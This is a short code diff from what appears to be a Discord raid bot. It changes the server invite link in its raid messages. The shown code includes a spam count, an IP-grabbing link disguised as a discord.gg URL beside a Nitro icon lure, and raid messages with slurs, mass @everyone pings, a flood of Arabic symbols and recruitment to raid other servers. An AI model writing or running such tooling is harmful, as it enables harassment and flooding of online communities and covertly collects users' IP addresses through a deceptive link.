@@ -13,7 +13,7 @@ const SPAM_COUNT       = 5;  // /spam spam count
 const NITRO_ICON = 'https://cdn3.emoji.gg/emojis/7536-nitro.png';
 const IPGRAB_LINK = 'https://discord-gg-zjk2bx79e.base44.app';
 
-const RAID_MESSAGE_SHORT = `# @everyone FUCK Y'ALL BITCHES, EASY RAID ATP JUST JOIN OUR SERVER https://discord.gg/uBgehrcTZd #`;
+const RAID_MESSAGE_SHORT = `# @everyone FUCK Y'ALL BITCHES, EASY RAID ATP JUST JOIN OUR SERVER https://discord.gg/X78u8V99vG #`;
 
 // ---- long arabic symbol raid ----
 const ARABIC_LINES = 60;            // how many lines
@@ -25,7 +25,7 @@ const RAID_MESSAGE_LONG = [
   '||<@everyone|@here>||',
   '-# Raided by Kxrzt',
   '-# Want to raid other servers? Join us.',
-  'https://discord.gg/uBgehrcTZd',
+  'https://discord.gg/X78u8V99vG',
 ].join('\n');
 
 const RAID_MESSAGES = {
